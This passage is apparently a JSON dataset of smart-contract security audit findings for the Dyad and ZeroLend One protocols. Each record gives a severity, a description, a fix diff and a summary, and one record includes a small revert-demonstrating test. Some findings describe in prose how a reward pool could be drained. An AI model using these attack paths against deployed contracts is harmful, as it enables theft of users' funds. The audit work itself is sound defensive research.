* bonus) / 1e18 = 1e18 + 10_000 * 1e25\n\n```\n\nIn this example, the user will have a `totalXP = 1e18` with the current code, but they should have `totalXP = 1e18 + 1e29` instead.\n\nThis will affect the `accrualRateModifier` the next time the function is called (for example, to calculate rewards of a Uniswap position), as the `totalXP` will be lower than intended.\n\n## Recommendations\n\nConsider applying the following fix:\n\n```diff\n    function initialize(address owner) public reinitializer(2) {\n        __UUPSUpgradeable_init();\n        __Ownable_init(msg.sender);\n\n        uint256 dnftSupply = DNFT.totalSupply();\n\n        for (uint256 i = 0; i < dnftSupply; ++i) {\n+       uint256 totalXP = _computeXP(noteData[i]);\n            noteData[i] = NoteXPData({\n                lastAction: uint40(block.timestamp),\n                keroseneDeposited: uint96(KEROSENE_VAULT.id2asset(i)),\n                lastXP: noteData[i].lastXP,\n-               totalXP: noteData[i].lastXP,\n+               totalXP: totalXP,\n                dyadMinted: DYAD.mintedDyad(i)\n            });\n        }\n    }\n\n```",
      "summary": "\nThe bug report is about a medium severity issue in the `DyadXPv2.sol` contract. During the contract's initialization, the `totalXP` of each user is calculated, but it doesn't consider the last accrued bonus. This is because the elapsed time between the upgrade and the user's last action is likely not zero. This can result in incorrect `totalXP` values, which can affect the `accrualRateModifier` and rewards for users. The report recommends a fix to correctly calculate the `totalXP` by using the `_computeXP` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41688",
      "title": "[H-01] Users will get 1/100 of the intended accrual rate",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nThe base accrual rate, as described in the documentation, should be `1e9`.\n\nHowever, in `DyadXPv2._computeXP` it is set to `1e7`:\n\n```solidity\n    uint256 adjustedAccrualRate = accrualRateModifier * 1e7;\n```\n\nAs such, users will get a meager yield for their deposit (2 orders of magnitude less than the intended value).\n\n## Recommendations\n\nConsider the following change:\n\n```diff\n-    uint256 adjustedAccrualRate = accrualRateModifier * 1e7;\n+    uint256 adjustedAccrualRate = accrualRateModifier * 1e9;\n```",
      "summary": "\nThe report is about a bug in the accrual rate for a smart contract called DyadXPv2. The bug causes the accrual rate to be set to a value that is 2 orders of magnitude lower than the intended value. This means that users will receive a much lower yield for their deposit than they should. The severity of the bug is considered medium and the likelihood of it occurring is high. The recommended fix is to change the value of the accrual rate from `1e7` to `1e9`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41687",
      "title": "[C-02] Underlying tokens of UniV3 Liquidity Position are unchecked",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nWithin `UniswapV3Staking.stake()`, the underlying tokens of the staked UniV3 Liquidity Position are unchecked. This lets a malicious actor create a new UniV3 pool with their own arbitrary ERC20 tokens, where they mint themselves a large number of tokens. This causes the `liquidity` of their position in this pool to be extremely high, allowing them to earn an extremely large amount of rewards from staking this position.\n\n## Recommendations\n\nWithin `stake()`, ensure that the underlying tokens of the position are USDC and DYAD",
      "summary": "\nThere is a high severity bug in the UniswapV3Staking contract that allows a malicious actor to earn a large amount of rewards by staking an arbitrary ERC20 token. This is due to the lack of checks on the underlying tokens of the staked UniV3 Liquidity Position. To fix this, the stake() function should be updated to only allow USDC and DYAD tokens as the underlying tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41686",
      "title": "[C-01] The entire kerosene supply can be drained by claiming rewards",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nThis is the current formula used to calculate rewards when a note is staked:\n\n```solidity\n\tfunction _calculateRewards(uint256 noteId, StakeInfo storage stakeInfo) internal view returns (uint256) {\n\t    uint256 timeDiff = block.timestamp - stakeInfo.lastRewardTime;\n\n\t    uint256 xp = dyadXP.balanceOfNote(noteId);\n\n->\t    return timeDiff * rewardsRate * stakeInfo.liquidity * xp;\n\t}\n```\n\nThe issue is that rewards can be extremely high, as the XP values are really big.\n\nKerosene has a total supply of: `1_000_000_000 1e18`, but most notes have too much XP.\n\nIn the best-case scenario, the XP will be larger than the total supply and it won't be possible to stake anything.\n\nIn the worst-case scenario, a user can claim most of the total supply with a minimal liquidity investment, as small as 1 wei.\n\n## Recommendations\n\nThe XP must be scaled down in the reward calculation.\nIt is recommended to divide by `1e18` after multiplying `rewardsRate` and `stakeInfo.liquidity` together. Depending on the order of magnitude of `xp` values, the same will have to be done when multiplying by `xp`.",
      "summary": "\nThe bug report shows a problem with the formula used to calculate rewards when someone stakes a note. The issue is that the rewards can be very high, making it impossible for users to stake or allowing them to claim most of the total supply with a small investment. The recommendation is to divide the XP values by `1e18` to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41836",
      "title": "M-15: The repayment process in the NFTPositionManager can sometimes be reverted",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488 \n\n## Found by \nObsidian, dany.armstrong90, ether\\_sky\n## Summary\nUsers can `supply` `assets` to the `pools` through the `NFTPositionManager` to earn `rewards` in  `zero` tokens. \nFunctions like `deposit`, `withdraw`, `repay`, and `borrow` should operate normally. \nHowever, due to an additional check, `repayments` might be reverted.\n## Vulnerability Detail\nHere's the relationship between `shares` (`s`) and `assets` (`a`) in the `Pool`:\n-  **Share to Asset Conversion:**\n   `a = [(s * I + 10^27 / 2) / 10^27] (rayMul)`\n```solidity\nfunction rayMul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n  assembly {\n    if iszero(or(iszero(b), iszero(gt(a, div(sub(not(0), HALF_RAY), b))))) { revert(0, 0) }\n    c := div(add(mul(a, b), HALF_RAY), RAY)\n  }\n}\n```\n- **Asset to Share Conversion:**\n    `s = [(a * 10^27 + I / 2) / I] (rayDiv)`\n```solidity\nfunction rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {\n  assembly {\n    if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) { revert(0, 0) }\n    c := div(add(mul(a, RAY), div(b, 2)), b)\n  }\n}\n```\n\n**Numerical Example:**\nSuppose there is a `pool` `P` where users `borrow` `assets` `A` using the `NFTPositionManager`.\n- The current `borrow index` of `P` is `2 * 10^27`, and the `share` is `5`.\n- The `previous debt balance` is as below (`Line 119`):\n    `previousDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(5 * 2 * 10^27 + 10^27 / 2) / 10^27] = 10`\n- If we are going to `repay` `3` `assets`:\n    - The removed `shares` is:\n        `[(a * 10^27 + I / 2) / I] = [(3 * 10^27 + 2 * 10^27 / 2) / (2 * 10^27)] = 2`\n    - Therefore, the remaining `share` is:\n        `5 - 2 = 3`\n- The `current debt balance` is as below  (`Line 121`):\n    `currentDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(3 * 2 * 10^27 + 10^27 / 2) / 10^27 = 6`\nThen in `line 123`, `previousDebtBalance - currentDebtBalance` would be `4` and `repaid.assets` is `3`.\nAs a result, the `repayment` would be reverted.\n```solidity\nfunction _repay(AssetOperationParams memory params) internal nonReentrant {\n119:  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n  DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n\n121:  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n  \n123:  if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n    revert NFTErrorsLib.BalanceMisMatch();\n  }\n}\n```\nThis example demonstrates a `potential 1 wei mismatch` between `previousDebtBalance` and `currentDebtBalance` due to rounding in the calculations.\n## Impact\nThis check seems to cause a `denial-of-service (DoS)` situation where `repayments` can fail due to small rounding errors. \nThis issue can occur with various combinations of `borrow index`, `share amounts`, and `repaid assets`.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L77\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L93\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L125\n## Tool used\n\nManual Review\n\n## Recommendation\nEither remove this check or adjust it to allow a `1 wei mismatch` to prevent unnecessary reversion of `repayments`.",
      "summary": "\nThe NFTPositionManager has a bug where the repayment process can sometimes be reversed. This means that users who supply assets to the pools to earn rewards in zero tokens may have their repayments fail due to a small rounding error. This can cause a denial-of-service situation where repayments fail. The bug was found by Obsidian, dany.armstrong90, and ether_sky. The code for the conversion between shares and assets is causing the issue and needs to be adjusted to allow for a small mismatch to prevent unnecessary reversions. The recommendation is to either remove the check or adjust it to allow for a 1 wei mismatch. The bug was found through manual review and can occur with various combinations of borrow index, share amounts, and repaid assets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488",
      "tags": [],
      "finders": [
        "Obsidian",
        "ether\\_sky",
        "dany.armstrong90"
      ]
    },
    {
      "id": "41835",
      "title": "M-14: NFTPositionManager's `repay()` and `repayETH()` are unavailable unless preceded atomically by an accounting updating operation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467 \n\n## Found by \n000000, A2-security, JCN, Obsidian, denzi\\_, hyh, stuart\\_the\\_minion, thisvishalsingh, zarkk01\n### Summary\n\nThe check in `_repay()` cannot be satisfied if pool state was not already updated by some other operation in the same block. This makes any standalone `repay()` and `repayETH()` calls revert, i.e. core repaying functionality can frequently be unavailable for end users since it's not packed with anything by default in production usage\n\n### Root Cause\n\n\nPool state wasn't updated before `previousDebtBalance` was set:\n\n[NFTPositionManager.sol#L115-L128](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManager.sol#L115-L128)\n\n```solidity\n  /// @inheritdoc INFTPositionManager\n  function repay(AssetOperationParams memory params) external {\n    if (params.asset == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();\n    IERC20Upgradeable(params.asset).safeTransferFrom(msg.sender, address(this), params.amount);\n>>  _repay(params);\n  }\n\n  /// @inheritdoc INFTPositionManager\n  function repayETH(AssetOperationParams memory params) external payable {\n    params.asset = address(weth);\n    if (msg.value != params.amount) revert NFTErrorsLib.UnequalAmountNotAllowed();\n    weth.deposit{value: params.amount}();\n>>  _repay(params);\n  }\n```\n\n[NFTPositionManagerSetters.sol#L105-L121](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L121)\n\n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    Position memory userPosition = _positions[params.tokenId];\n\n    IPool pool = IPool(userPosition.pool);\n    IERC20 asset = IERC20(params.asset);\n\n    asset.forceApprove(userPosition.pool, params.amount);\n\n>>  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n>>  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n```\n\n[PoolGetters.sol#L94-L97](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L94-L97)\n\n```solidity\n  function getDebt(address asset, address who, uint256 index) external view returns (uint256 debt) {\n    bytes32 positionId = who.getPositionId(index);\n>>  return _balances[asset][positionId].getDebtBalance(_reserves[asset].borrowIndex);\n  }\n```\n\nBut it was updated in `pool.repay()` before repayment workflow altered the state:\n\n[BorrowLogic.sol#L117-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L125)\n\n```solidity\n  function executeRepay(\n    ...\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n>>  reserve.updateState(params.reserveFactor, cache);\n```\n\n[ReserveLogic.sol#L87-L95](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L87-L95)\n\n```solidity\n  function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\n    // If time didn't pass since last stored timestamp, skip state update\n    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;\n\n>>  _updateIndexes(self, _cache);\n    _accrueToTreasury(_reserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n  }\n```\n\n[ReserveLogic.sol#L220-L238](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L220-L238)\n\n```solidity\n  function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n    ...\n    if (_cache.currDebtShares != 0) {\n      uint256 cumulatedBorrowInterest = MathUtils.calculateCompoundedInterest(_cache.currBorrowRate, _cache.reserveLastUpdateTimestamp);\n      _cache.nextBorrowIndex = cumulatedBorrowInterest.rayMul(_cache.currBorrowIndex).toUint128();\n>>    _reserve.borrowIndex = _cache.nextBorrowIndex;\n    }\n```\n\nThis way the `previousDebtBalance - currentDebtBalance` consists of state change due to the passage of time since last update and state change due to repayment:\n\n[NFTPositionManagerSetters.sol#L105-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L125)\n\n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    Position memory userPosition = _positions[params.tokenId];\n\n    IPool pool = IPool(userPosition.pool);\n    IERC20 asset = IERC20(params.asset);\n\n    asset.forceApprove(userPosition.pool, params.amount);\n\n    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n    uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n>>  if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n      revert NFTErrorsLib.BalanceMisMatch();\n    }\n```\n\n`previousDebtBalance` can be stale and, in general, it is `previousDebtBalance - currentDebtBalance = (actualPreviousDebtBalance - currentDebtBalance) - (actualPreviousDebtBalance - previousDebtBalance) = repaid.assets - {debt growth due to passage of time since last update} < repaid.assets`, where `actualPreviousDebtBalance` is `pool.getDebt()` result after `reserve.updateState()`, but before repayment\n\n### Internal pre-conditions\n\nInterest rate and debt are positive, so there is some interest accrual happens over time. This is normal (going concern) state of any pool\n\n### External pre-conditions\n\nNo other state updating operations were run since the last block\n\n### Attack Path\n\nNo direct attack needed in this case, a protocol malfunction causes loss to some users\n\n### Impact\n\nCore system functionality, `repay()` and `repayETH()`, are unavailable whenever aren't grouped with other state updating calls, which is most of the times in terms of the typical end user interactions. Since the operation is time sensitive and is typically run by end users directly, this means that there is a substantial probability that unavailability in this case leads to losses, e.g. a material share of NFTPositionManager users cannot repay in time and end up being liquidated as a direct consequence of the issue (i.e. there are other ways to meet the risk, but time and investigational effort are needed, while liquidations will not wait).\n\nOverall probability is medium: interest accrues almost always and most operations are stand alone (cumulatively high probability) and repay is frequently enough called close to liquidation (medium probability). Overall impact is high: loss is deterministic on liquidation, is equal to liquidation penalty and can be substantial in absolute terms for big positions. The overall severity is high\n\n### PoC\n\nA user wants and can repay the debt that is about to be liquidated, but all the repayment transactions revert, being done straightforwardly at a stand alone basis, meanwhile the position is liquidated, bearing the corresponding penalty as net loss\n\n### Mitigation\n\nConsider adding direct reserve update before reading from the state, e.g.:\n\n[NFTPositionManagerSetters.sol#L119](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119)\n\n```diff\n+   pool.forceUpdateReserve(params.asset);\n    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n```\n\n\n\n\n## Discussion\n\n**0xjuaan**\n\nshouldn't this be high severity because the only way to retrieve the stuck funds would be for each individual user to somehow atomically update the interest rate before repayment?\n\n**Haxatron**\n\nEscalate\n\nFinal time to use this \n\n**sherlock-admin3**\n\n> Escalate\n> \n> Final time to use this \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThis is the High severity rule:\n\n> Definite loss of funds without (extensive) **limitations of external conditions**. The loss of the affected party must exceed 1%.\n\nMedium: \n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nWe can see that in this issue, we have no loss of funds without any constrains.\n\nThe main impact is that the `repay()` functionality may not work in certain circumstances, and more matches the rule for Medium severity. : `Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party`.\n\nPlanning to reject the escalation and leave the issue as is.\n\n\n\n**0xjuaan**\n\n@cvetanovv \n\nThe reason why it's high severity is that the user will not be able to withdraw a certain amount of collateral, since they cant repay.\n\nLets say they deposit $100 and borrow $80. (LTV is 80%)\n\nNow they cant repay the $80, so their $100 is stuck forever. So they effectively lost $20. \n\n**DemoreXTess**\n\n@0xjuaan How it's stuck I don't understand ? It will revert after if statement.\n\n**0xjuaan**\n\n@DemoreXTess repayment reverts, so they cant withdraw their collateral (they need to repay debt in order to withdraw collateral), so they lose funds since collateral value > debt value\n\n**iamnmt**\n\nI believe this issue is low severity.\n\nThe user can call `pool.forceUpdateReserve` before `repay` and `repayETH` to update the `borrowIndex`, and then the repayment will not revert. If the user fails to do so, then it is a user mistake.\n\n**cvetanovv**\n\nAs I wrote in my previous comment `repay()` and `repayETH()` do not work as they should. This is the main impact and because of this, I classify this issue as Medium severity. We have broken functionality.\n\nMy decision to reject the escalation remains.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467/#issuecomment-2394853299): rejected",
      "summary": "\nThis bug report discusses an issue with the `repay()` and `repayETH()` functions in the NFTPositionManager contract. These functions are not working properly and may cause a loss of funds for users. This is considered a medium severity issue because it breaks core contract functionality, but requires specific conditions to occur. The impact is that users may not be able to withdraw their collateral, resulting in a loss of funds. To mitigate this issue, the team should consider adding a direct reserve update before reading from the state. This issue has been resolved and was found by several security researchers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "zarkk01",
        "JCN",
        "denzi\\_",
        "thisvishalsingh",
        "000000",
        "Obsidian",
        "hyh",
        "A2-security"
      ]
    },
    {
      "id": "41834",
      "title": "M-13: Curated Vault allocators cannot `reallocate()` a pool to zero due to attempting to withdraw 0 tokens from the underlying pool",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434 \n\n## Found by \n000000, 0xAristos, 0xc0ffEE, A2-security, KupiaSec, Nihavent, Obsidian, Varun\\_05, aman, dany.armstrong90, hyh, iamnmt, karsar, rilwan99, stuart\\_the\\_minion, theweb3mechanic, trachev, wickie, zarkk01\n### Summary\n\nThe `reallocate()` function is the primary way a curated vault can remove liquidity from an underlying pool, so being unable to fully remove the liquidity is problematic. However, due to a logic issue in the implementation, any attempt to `reallocate()` liquidity in a pool to zero will revert. \n\n### Root Cause\n\nThe function `CuratedVault::reallocate()` is callable by an allocator and reallocates funds between underlying pools. As shown below, `toWithdraw` is the difference between `supplyAssets` (total assets in the underlying pool controlled by the curated vault) and the `allocation.assets` which is the target allocation for this pool. Therefore, if `toWithdraw` is greater than zero, a withdrawal is required from that pool:\n\n```javascript\n  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {\n    uint256 totalSupplied;\n    uint256 totalWithdrawn;\n\n    for (uint256 i; i < allocations.length; ++i) {\n      MarketAllocation memory allocation = allocations[i];\n      IPool pool = allocation.market;\n\n      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);\n@>    uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);\n\n      if (toWithdraw > 0) {\n        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);\n\n        // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.\n        uint256 shares;\n        if (allocation.assets == 0) {\n          shares = supplyShares;\n@>        toWithdraw = 0;\n        }\n\n@>      DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);\n        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);\n        totalWithdrawn += burnt.assets;\n      } else {\n        \n        ... SKIP!...\n      }\n    }\n```\n\nThe issue arrises when for any given pool, `allocation.assets` is set to 0, meaning the allocator wishes to empty that pool and allocate the liquidity to another pool. Under this scenario, `toWithdraw` is set to 0, and passed into `Pool::withdrawSimple()`. This is a logic mistake to attempt to withdraw 0 instead of the `supplyAssets` when attempting to withdraw all liquidity to a pool. The call will revert due to a [check](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L97) in the pool's withdraw flow that ensures the amount being withdrawn is greater than 0.\n\nIt seems this bug is a result of forking the Metamorpho codebase which [implements the same logic](https://github.com/morpho-org/metamorpho/blob/cc6b01610c9b0000d965faef705e1670859d9c0f/src/MetaMorpho.sol#L382-L389). However, Metamorpho's underlying withdraw() function [can take either an asset amount or share amount](https://github.com/morpho-org/morpho-blue/blob/0448402af51b8293ed36653de43cbee8d4d2bfda/src/Morpho.sol#L216-L217), but ZeroLend's `Pool::withdrawSimple()` only [accepts an amount of assets](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L94). \n\n### Internal pre-conditions\n\n1. A curated vault having more than 1 underlying pool in the `supplyQueue`\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. A curated vault is setup with more than 1 underlying pool in the `supplyQueue`\n2. An allocator wishes to reallocate all the supplied liquidity from one pool to another\n3. The allocator calls constructs the array of `MarketAllocation` withdrawing all liquidity from the first pool and depositing the same amount to the second pool\n4. The action fails due to the described bug\n\n### Impact\n\n- Allocators cannot remove all liquidity in a pool throuhg the `reallocate()` function. The natspec comments indicate that emptying a pool to zero through the `reallocate()` function is the [first step of the intended way to remove a pool](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/vaults/ICuratedVaultBase.sol#L141-L142).  \n\n### PoC\n\nPaste and run the below test in /test/forge/core/vaults/. It shows a simple 2-pool vault with a single depositors. An allocator attempts to reallocate the liquidity in the first pool to the second pool, but reverts due to the described issue.\n\n```javascript\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity ^0.8.0;\n\nimport {Math} from '@openzeppelin/contracts/utils/math/Math.sol';\nimport './helpers/IntegrationVaultTest.sol';\nimport {console2} from 'forge-std/src/Test.sol';\nimport {MarketAllocation} from '../../../../contracts/interfaces/vaults/ICuratedVaultBase.sol';\n\ncontract POC_AllocatorCannotReallocateToZero is IntegrationVaultTest {\n  function setUp() public {\n    _setUpVault();\n    _setCap(allMarkets[0], CAP);\n    _sortSupplyQueueIdleLast();\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n  }\n\n  function test_POC_AllocatorCannotReallocateToZero() public {\n\n    // 1. supplier supplies to underlying pool through curated vault\n    uint256 assets = 10e18;\n    loanToken.mint(supplier, assets);\n\n    vm.startPrank(supplier);\n    uint256 shares = vault.deposit(assets, onBehalf);\n    vm.stopPrank();\n\n    // 2. Allocator attempts to reallocate all of these funds to another pool\n    MarketAllocation[] memory allocations = new MarketAllocation[](2);\n    \n    allocations[0] = MarketAllocation({\n        market: vault.supplyQueue(0),\n        assets: 0\n    });\n\n    // Fill in the second MarketAllocation struct\n    allocations[1] = MarketAllocation({\n        market: vault.supplyQueue(1),\n        assets: assets\n    });\n\n    vm.startPrank(allocator);\n    vm.expectRevert(\"NOT_ENOUGH_AVAILABLE_USER_BALANCE\");\n    vault.reallocate(allocations); // Reverts due to attempting a withdrawal amount of 0\n  }\n}\n```\n\n### Mitigation\n\nThe comment \"Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market\" does not seem to apply to Zerolend pools as a donation to the pool would not disable the market, nor would it affect the amount of assets the curated vault can withdraw from the underlying pool. With this in mind, Metamorpho's safety check can be removed:\n\n```diff\n  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {\n    uint256 totalSupplied;\n    uint256 totalWithdrawn;\n\n\n    for (uint256 i; i < allocations.length; ++i) {\n      MarketAllocation memory allocation = allocations[i];\n      IPool pool = allocation.market;\n\n      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);\n      uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);\n\n      if (toWithdraw > 0) {\n        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);\n\n\n-       // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.\n-       uint256 shares;\n-       if (allocation.assets == 0) {\n-         shares = supplyShares;\n-         toWithdraw = 0;\n-       }\n\n        DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);\n        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);\n        totalWithdrawn += burnt.assets;\n      } else {\n        uint256 suppliedAssets =\n          allocation.assets == type(uint256).max ? totalWithdrawn.zeroFloorSub(totalSupplied) : allocation.assets.zeroFloorSub(supplyAssets);\n\n        if (suppliedAssets == 0) continue;\n\n        uint256 supplyCap = config[pool].cap;\n        if (supplyCap == 0) revert CuratedErrorsLib.UnauthorizedMarket(pool);\n\n        if (supplyAssets + suppliedAssets > supplyCap) revert CuratedErrorsLib.SupplyCapExceeded(pool);\n\n        // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.\n        IERC20(asset()).forceApprove(address(pool), type(uint256).max);\n        DataTypes.SharesType memory minted = pool.supplySimple(asset(), address(this), suppliedAssets, 0);\n        emit CuratedEventsLib.ReallocateSupply(_msgSender(), pool, minted.assets, minted.shares);\n        totalSupplied += suppliedAssets;\n      }\n    }\n\n    if (totalWithdrawn != totalSupplied) revert CuratedErrorsLib.InconsistentReallocation();\n  }\n```",
      "summary": "\nThe `reallocate()` function in the Curated Vault is used to remove liquidity from an underlying pool. However, due to a logic issue, attempting to remove all liquidity from a pool by setting it to zero will cause the function to fail. This is because the function tries to withdraw 0 tokens from the pool, which is not allowed. This bug was found by several individuals and can be fixed by removing a safety check in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434",
      "tags": [],
      "finders": [
        "dany.armstrong90",
        "trachev",
        "wickie",
        "iamnmt",
        "aman",
        "zarkk01",
        "KupiaSec",
        "000000",
        "theweb3mechanic",
        "Obsidian",
        "0xAristos",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "karsar",
        "Varun\\_05",
        "rilwan99",
        "0xc0ffEE",
        "hyh"
      ]
    },
    {
      "id": "41833",
      "title": "M-12: `CuratedVaultSetters::_supplyPool()` does not consider the pool cap of the underlying pool, which may cause `deposit()` to revert or lead to an unintended reordering of `supplyQueue`",
      "impact": "MEDIUM",
